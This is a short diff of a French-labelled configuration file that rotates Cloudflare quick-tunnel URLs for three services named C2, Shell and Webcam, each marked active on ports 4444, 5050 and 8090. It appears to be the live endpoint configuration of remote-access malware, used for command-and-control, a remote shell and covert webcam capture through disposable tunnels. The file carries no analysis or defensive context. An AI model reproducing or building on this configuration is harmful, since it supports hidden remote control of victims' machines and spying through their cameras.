@@ -1,20 +1,20 @@
-# Tunnels Cloudflared - Mise à jour: 2025-08-23 20:15:04
+# Tunnels Cloudflared - Mise à jour: 2025-08-23 20:21:40
 # Version: 3.1
 
 [C2]
-URL=https://path-stripes-ground-coaches.trycloudflare.com
+URL=https://misc-loose-tenant-plains.trycloudflare.com
 PORT=4444
 TYPE=socket
 STATUS=ACTIVE
 
 [Shell]
-URL=https://reductions-biological-ignore-xp.trycloudflare.com
+URL=https://dial-hear-frame-hydrogen.trycloudflare.com
 PORT=5050
 TYPE=socket
 STATUS=ACTIVE
 
 [Webcam]
-URL=https://uncle-fred-section-jackson.trycloudflare.com
+URL=https://julia-dj-federation-indication.trycloudflare.com
 PORT=8090
 TYPE=flask
 STATUS=ACTIVE
